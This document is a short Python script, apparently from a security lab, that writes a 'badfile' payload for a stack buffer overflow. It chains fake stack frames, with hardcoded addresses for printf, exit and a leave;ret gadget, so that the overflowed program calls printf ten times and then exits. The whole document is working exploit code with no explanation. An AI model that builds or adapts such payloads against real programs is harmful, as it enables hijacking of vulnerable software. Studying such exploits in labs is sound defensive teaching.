#!/usr/bin/python3 
import sys 

start = 112
hello_addr = 0xffffdf81
ebp_value = 0xffffd128
printf_addr = 0xf7e21de0 
exit_addr = 0xf7e05f80 
leaveret = 0x565562ce 

content = bytearray(0xaa for i in range(1000))

# bof() to leaveret 
ebp_value += 8    
content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
start += 4 

# printf 
for i in range(0, 10):
    ebp_value += 16 
    content[start:start+4] = (ebp_value).to_bytes(4, byteorder='little') 
    start += 4 
    content[start:start+4] = (printf_addr).to_bytes(4, byteorder='little') 
    start += 4 
    content[start:start+4] = (leaveret).to_bytes(4, byteorder='little') 
    start += 4
    content[start:start+4] = (hello_addr).to_bytes(4, byteorder='little') 
    start += 4

# exit 
content[start:start+4] = (0xffffffff).to_bytes(4, byteorder='little') 
start += 4
content[start:start+4] = (exit_addr).to_bytes(4, byteorder='little') 

with open("badfile", "wb") as f:
    f.write(content)
